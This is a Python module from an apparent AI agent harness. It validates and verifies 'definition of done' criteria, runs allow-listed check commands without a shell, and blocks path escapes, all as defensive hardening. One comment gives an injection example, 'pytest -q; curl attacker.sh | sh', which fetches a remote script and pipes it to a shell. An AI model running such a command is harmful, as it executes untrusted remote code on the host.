"""Definitions of done: validation, mandatory bars, and verification.

A task is not done because an agent says so. It is done when each mandatory
criterion has been independently proven, with evidence recorded against it. This
module is what makes that claim enforceable:

* :func:`validate_criteria` rejects criteria that cannot be checked at all.
* :func:`apply_quality_bars` adds the tests / security / code-quality criteria
  policy requires, where the task admits them.
* :func:`verify_criterion` proves a single criterion, either by running the
  check here or by handing it to the host to run.
"""

from __future__ import annotations

import json
import re
import shlex
import subprocess
from dataclasses import dataclass
from pathlib import Path

from ..config import Policy
from ..ids import now_iso
from ..models import (
    CriterionStatus,
    DoDCriterion,
    ExecutionTask,
    Severity,
    VerifyMethod,
)

# Statements that assert a feeling rather than a fact. A criterion phrased this
# way cannot fail, which means it cannot verify anything either.
_VAGUE = re.compile(
    r"\b(works?\s+(well|correctly|properly|as\s+expected)|good|better|improved?|"
    r"clean|nice|robust|proper(ly)?|appropriate(ly)?|reasonable|adequate|"
    r"sufficient(ly)?|high[- ]quality|best\s+practice)\b",
    re.IGNORECASE,
)

_CODE_HINT = re.compile(
    r"\.(py|js|ts|tsx|jsx|go|rs|rb|java|kt|cs|c|cc|cpp|h|hpp|php|swift|scala|sh)\b"
    r"|\b(function|class|module|endpoint|api|handler|service|test|refactor|implement)\b",
    re.IGNORECASE,
)


# What it takes for a proposed criterion to already cover one of the mandatory
# bars, and so for that bar not to be added.
#
# Each alternative has to match a phrase that *is* the check, never one that
# merely names its subject: "the output format is JSON" is about the data the
# code emits, "the seed test data loads" is about a fixture, and "the security
# cameras record" is about a domain. None of them proves anything about
# formatting, about the suite, or about untrusted input, yet each of them
# removed a mandatory bar while the bar was matched on a bare word. Anchoring
# was only half the fix -- it stopped `auth` matching inside `author`, but
# `format`, `test` and `security` are whole words in their own right.
#
# Every pattern below matches a subset of what its bare word list matched, so
# the narrowing can only restore a bar that used to be suppressed; it can never
# suppress one that used to be added.
_COVERS_TESTS = re.compile(
    r"""
      \b(go|cargo|npm|yarn|pnpm|dotnet|mvn|gradle|make)\s+tests?\b
    | \bcoverage\b
    | \b(unit|integration|regression|smoke|e2e|end-to-end|automated|failing)[\s-]tests?\b
    | \btests?\s+(pass\w*|cover\w*|exercise\w*|exist\w*|fail\w*)\b
    | \b(test|spec)s?\s+(suite|case|cases|file|files)\b
    | \b(suite|specs?)\s+pass\w*\b
    """,
    re.VERBOSE,
)

_COVERS_SECURITY = re.compile(
    r"""
      \b(injection|authn|authz|authentic|authoris|authoriz|secret
        |validat|sanitis|sanitiz)\w*\b
    | \bsecurity\s+(review|audit|check|checks|scan\w*|weakness\w*|issues?|risks?
        |control|controls|implications?|boundary|hardening|posture|tests?)\b
    | \b(review|audit|assess|check|scan)\w*\s+for\s+security\b
    """,
    re.VERBOSE,
)

_COVERS_CODE_QUALITY = re.compile(
    r"""
      \blint\w*\b
    | \bformatt(ing|er|ers|ed)\b
    | \b(code|coding)\s+(style|quality)\b
    | \bstyle\s?guide\b
    | \bstyle\s+(convention|rule)s?\b
    | \bquality\s+(gate|bar|check|checks)\b
    """,
    re.VERBOSE,
)


# Executables a criterion's command may name. A definition of done proves
# something by running the project's own checks, so this list is deliberately
# small: the command string is copied verbatim out of a model's JSON by
# ``parse_dod``, which makes it untrusted input, and anything outside the list
# is a request to run arbitrary code with the harness's own permissions.
VERIFY_EXECUTABLES = frozenset({
    "python", "python3", "py", "pytest", "tox", "coverage", "mypy", "ruff",
    "flake8", "pylint", "black", "isort", "bandit",
    "npm", "npx", "pnpm", "yarn", "node", "jest", "vitest", "eslint", "tsc",
    "go", "cargo", "rustc", "dotnet", "mvn", "gradle", "make", "cmake", "ctest",
    "rake", "rspec", "bundle", "phpunit", "swift",
})

# Characters that hand the rest of a command to a shell. They only matter
# unquoted: ``python -c "print(1); raise SystemExit(1)"`` is a single argument,
# while ``pytest -q; curl attacker.sh | sh`` is three commands.
_METACHARACTERS = ";&|<>`$\n\r"


@dataclass
class CriterionIssue:
    criterion_id: str
    problem: str
    severity: Severity = Severity.MEDIUM


# --------------------------------------------------------------------------
# Validation
# --------------------------------------------------------------------------


def validate_criteria(criteria: list[DoDCriterion], policy: Policy) -> list[CriterionIssue]:
    """Report everything that makes this definition of done unenforceable."""
    issues: list[CriterionIssue] = []
    mandatory = [c for c in criteria if c.mandatory]

    if len(criteria) < policy.min_dod_criteria:
        issues.append(
            CriterionIssue(
                "-",
                f"only {len(criteria)} criteria; policy requires at least "
                f"{policy.min_dod_criteria}",
                Severity.HIGH,
            )
        )
    if not mandatory:
        issues.append(CriterionIssue("-", "no mandatory criteria: nothing can fail", Severity.HIGH))
    if mandatory and not any(c.machine_checkable for c in mandatory):
        issues.append(
            CriterionIssue(
                "-",
                "every mandatory criterion is a subjective review; at least one must be "
                "checkable by command, test or inspection",
                Severity.HIGH,
            )
        )

    for crit in criteria:
        statement = crit.statement.strip()
        if not statement:
            issues.append(CriterionIssue(crit.id, "empty statement", Severity.HIGH))
            continue
        if _VAGUE.search(statement) and crit.method is not VerifyMethod.REVIEW:
            issues.append(
                CriterionIssue(
                    crit.id,
                    f"unfalsifiable wording ({statement[:60]!r}); state the observable outcome",
                    Severity.MEDIUM,
                )
            )
        if " and " in statement.lower() and crit.method is not VerifyMethod.REVIEW:
            issues.append(
                CriterionIssue(
                    crit.id,
                    "compound statement: split it so each half can pass or fail alone",
                    Severity.LOW,
                )
            )
        if crit.method in (VerifyMethod.COMMAND, VerifyMethod.TEST) and not crit.command.strip():
            issues.append(
                CriterionIssue(crit.id, f"method={crit.method.value} but no command given",
                               Severity.HIGH)
            )
        if crit.method is VerifyMethod.REVIEW and not crit.rubric.strip():
            issues.append(
                CriterionIssue(crit.id, "review criterion has no rubric to judge against",
                               Severity.MEDIUM)
            )
        if crit.method is VerifyMethod.INSPECTION and not crit.expect.strip():
            issues.append(
                CriterionIssue(crit.id, "inspection criterion does not say what proves it",
                               Severity.MEDIUM)
            )
    return issues


def touches_code(task: ExecutionTask) -> bool:
    """Whether the quality bars meaningfully apply to this task."""
    haystack = " ".join([task.title, task.action, *task.scope.paths])
    return bool(_CODE_HINT.search(haystack))


def detect_test_command(workspace: Path) -> str:
    """Best guess at how this project runs its tests.

    A test criterion with no command cannot be proven mechanically, so it decays
    into a model's opinion about whether tests pass -- which is exactly the kind
    of unverified assurance the harness exists to prevent. Guessing the runner
    from the project's own files keeps the criterion checkable.
    """
    if not workspace.is_dir():
        return ""

    if (workspace / "pyproject.toml").is_file() or (workspace / "pytest.ini").is_file():
        return "pytest -q"
    if any(workspace.rglob("test_*.py")) or (workspace / "tests").is_dir():
        return "pytest -q"

    package = workspace / "package.json"
    if package.is_file():
        try:
            scripts = json.loads(package.read_text(encoding="utf-8")).get("scripts", {})
        except (json.JSONDecodeError, OSError):
            scripts = {}
        if "test" in scripts:
            return "npm test --silent"
    if (workspace / "go.mod").is_file():
        return "go test ./..."
    if (workspace / "Cargo.toml").is_file():
        return "cargo test"
    return ""


def apply_quality_bars(
    task: ExecutionTask, policy: Policy, workspace: Path | None = None
) -> list[DoDCriterion]:
    """Add the mandatory bars policy requires, where the task admits them.

    Returns only the criteria that were added, so the caller can tell the user
    what the harness inserted on their behalf.
    """
    if not touches_code(task):
        return []

    # A bar is skipped only when the proposed criteria already cover it, which
    # takes a phrase that means the check itself -- see the _COVERS_ patterns
    # above. A bar a criterion can suppress by naming the task's subject matter
    # is not a mandatory bar at all.
    existing = " ".join(c.statement.lower() + " " + c.command.lower() for c in task.dod)
    added: list[DoDCriterion] = []

    if policy.require_tests and not _COVERS_TESTS.search(existing):
        added.append(
            DoDCriterion(
                statement=(
                    "Automated tests cover the behaviour changed by this task, including "
                    "at least one failure or edge case, and the suite passes"
                ),
                method=VerifyMethod.TEST,
                command=detect_test_command(workspace) if workspace else "",
                expect="0",
                mandatory=True,
            )
        )

    if policy.require_security_review and not _COVERS_SECURITY.search(existing):
        added.append(
            DoDCriterion(
                statement=(
                    "The change introduces no new untrusted-input, secret-handling or "
                    "authorisation weakness"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Trace each new or modified input path to its use. Pass only if "
                    "untrusted input is validated before use, secrets are neither logged "
                    "nor returned, and authorisation checks fail closed."
                ),
                mandatory=True,
            )
        )

    if policy.require_code_quality and not _COVERS_CODE_QUALITY.search(existing):
        added.append(
            DoDCriterion(
                statement=(
                    "The change follows the conventions of the files it touches and "
                    "introduces no duplicated logic that already exists in the codebase"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Compare against the surrounding code. Pass only if naming, structure "
                    "and error handling match local convention, and no copied block "
                    "duplicates an existing helper."
                ),
                mandatory=True,
            )
        )

    task.dod.extend(added)
    task.updated_at = now_iso()
    return added


# --------------------------------------------------------------------------
# Verification
# --------------------------------------------------------------------------


@dataclass
class VerificationOutcome:
    status: CriterionStatus
    evidence: str
    verified_by: str = "harness"


def unquoted_metacharacter(command: str, characters: str = _METACHARACTERS) -> str | None:
    """The first of ``characters`` outside quotes, or ``None`` if there is none.

    Quoting is what separates ``python -c "a; b"`` -- one argument to one
    program -- from ``a; b``, which is two commands. A token scan cannot tell
    them apart after the fact, so the raw string is read here instead.

    ``characters`` defaults to the metacharacters that chain or redirect a
    command; :mod:`.tools` passes the glob characters instead, which are
    dangerous for a different reason but need the same quote-aware scan.
    """
    quote = ""
    for char in command:
        if quote:
            if char == quote:
                quote = ""
        elif char in "'\"":
            quote = char
        elif char in characters:
            return char
    return None


def executable_name(token: str) -> str:
    """The bare program name a command's first token invokes.

    ``/usr/bin/python3``, ``C:\\Python\\python.EXE`` and ``python`` are the same
    program, and an allow-list has to compare them as one.
    """
    return Path(token.replace("\\", "/")).name.lower().removesuffix(".exe")


def unsafe_command(command: str) -> str | None:
    """Why this command must not be run here, or ``None`` if it may be.

    Criterion commands arrive as model output (``parse_dod``) and are run with
    the harness's own permissions, so they are checked before use rather than
    trusted: no shell, and only the project's own check runners.
    """
    tokens = shell_split(command)
    if not tokens:
        return "the command is empty once tokenised"

    metacharacter = unquoted_metacharacter(command)
    if metacharacter is not None:
        return (
            f"it contains the unquoted shell metacharacter {metacharacter!r}, and "
            "criterion commands are run without a shell. Express each check as its "
            "own criterion instead of chaining or redirecting them"
        )

    executable = executable_name(tokens[0])
    if executable not in VERIFY_EXECUTABLES:
        return (
            f"{executable!r} is not one of the check runners a criterion may invoke "
            f"({', '.join(sorted(VERIFY_EXECUTABLES))}). Verify this by review, or by "
            "a command the user chooses to run themselves"
        )
    return None


def verify_command(
    criterion: DoDCriterion,
    workspace: Path,
    timeout: int = 300,
) -> VerificationOutcome:
    """Run a command criterion and judge it by exit code and expected output.

    Only reached when the caller has established that running commands here is
    permitted; see :func:`verify_criterion`. The command is tokenised and run
    without a shell, and refused outright unless :func:`unsafe_command` clears
    it -- a criterion the harness will not run is blocked, and blocked is not
    proven, so refusing here cannot certify anything.
    """
    command = criterion.command.strip()
    if not command:
        return VerificationOutcome(CriterionStatus.BLOCKED, "no command specified")

    refusal = unsafe_command(command)
    if refusal is not None:
        return VerificationOutcome(
            CriterionStatus.BLOCKED, f"refused to run {command!r}: {refusal}"
        )

    try:
        completed = subprocess.run(  # noqa: S603 - tokenised, no shell, allow-listed
            shell_split(command),
            shell=False,
            cwd=str(workspace),
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return VerificationOutcome(
            CriterionStatus.FAIL, f"command timed out after {timeout}s: {command}"
        )
    except OSError as exc:
        return VerificationOutcome(CriterionStatus.BLOCKED, f"could not run {command!r}: {exc}")

    output = (completed.stdout + completed.stderr).strip()
    tail = output[-1500:]
    evidence = f"$ {command}\nexit={completed.returncode}\n{tail}"

    expect = criterion.expect.strip()
    if not expect:
        ok = completed.returncode == 0
    else:
        # An expectation is either an exit code, or a substring that must appear
        # in the output *of a command that also succeeded*. Treating a substring
        # as sufficient on its own was a bug with real consequences: a test
        # command that printed "3 tests failed" and exited 1 satisfied an
        # expectation of "tests", so the check whose whole purpose is refusing
        # unproven work certified a failing suite.
        exit_match = re.fullmatch(r"(?:exit\s*(?:code)?\s*[= ]\s*)?(\d+)", expect, re.IGNORECASE)
        if exit_match:
            ok = completed.returncode == int(exit_match.group(1))
        else:
            ok = completed.returncode == 0 and expect.lower() in output.lower()
            if completed.returncode != 0 and expect.lower() in output.lower():
                evidence += (
                    f"\n\n[supervisor] the expected text {expect!r} appeared, but the "
                    f"command exited {completed.returncode}; a criterion is not met by "
                    "a command that failed. Express an expected failure as an exit code."
                )

    return VerificationOutcome(
        CriterionStatus.PASS if ok else CriterionStatus.FAIL, evidence
    )


def verify_inspection(criterion: DoDCriterion, workspace: Path) -> VerificationOutcome:
    """Check a file-state expectation of the form ``path: substring``."""
    expect = criterion.expect.strip()
    if ":" not in expect:
        return VerificationOutcome(
            CriterionStatus.BLOCKED,
            "inspection expectation must read 'path/to/file: text that must be present'",
        )
    raw_path, _, needle = expect.partition(":")
    path = (workspace / raw_path.strip()).resolve()
    needle = needle.strip()

    try:
        path.relative_to(workspace.resolve())
    except ValueError:
        return VerificationOutcome(
            CriterionStatus.BLOCKED, f"path escapes the workspace: {raw_path.strip()}"
        )
    if not path.is_file():
        return VerificationOutcome(CriterionStatus.FAIL, f"{raw_path.strip()} does not exist")

    try:
        content = path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return VerificationOutcome(CriterionStatus.BLOCKED, f"could not read {raw_path}: {exc}")

    if not needle:
        return VerificationOutcome(CriterionStatus.PASS, f"{raw_path.strip()} exists")

    if needle in content:
        line_no = content[: content.index(needle)].count("\n") + 1
        return VerificationOutcome(
            CriterionStatus.PASS, f"{raw_path.strip()}:{line_no} contains {needle!r}"
        )
    return VerificationOutcome(
        CriterionStatus.FAIL, f"{raw_path.strip()} does not contain {needle!r}"
    )


def verify_criterion(
    criterion: DoDCriterion,
    workspace: Path,
    policy: Policy,
    *,
    allow_commands: bool,
) -> VerificationOutcome | None:
    """Verify a criterion here, or return ``None`` to delegate it.

    ``None`` means the harness cannot or should not prove this one itself --
    review criteria always need a judge, and commands only run when explicitly
    permitted. Those go to the host or a verification agent instead.
    """
    if criterion.method is VerifyMethod.INSPECTION:
        return verify_inspection(criterion, workspace)

    if criterion.method in (VerifyMethod.COMMAND, VerifyMethod.TEST):
        if not allow_commands:
            return None
        return verify_command(criterion, workspace)

    return None


def summarise(task: ExecutionTask) -> str:
    """One-line status of a task's definition of done."""
    mandatory = task.mandatory_criteria
    passed = sum(1 for c in mandatory if c.status is CriterionStatus.PASS)
    waived = sum(1 for c in mandatory if c.status is CriterionStatus.WAIVED)
    failed = [c for c in mandatory if c.status is CriterionStatus.FAIL]
    parts = [f"{passed}/{len(mandatory)} mandatory criteria proven"]
    if waived:
        parts.append(f"{waived} waived")
    if failed:
        parts.append(f"{len(failed)} failing")
    return ", ".join(parts)


def shell_split(command: str) -> list[str]:
    """Best-effort tokenisation, used for display and for shell-free execution.

    A command that :func:`unsafe_command` has cleared contains no unquoted
    metacharacter, so this tokenisation is the whole of its meaning; the
    fallback exists only so a malformed command can still be shown.
    """
    try:
        return shlex.split(command)
    except ValueError:
        return command.split()
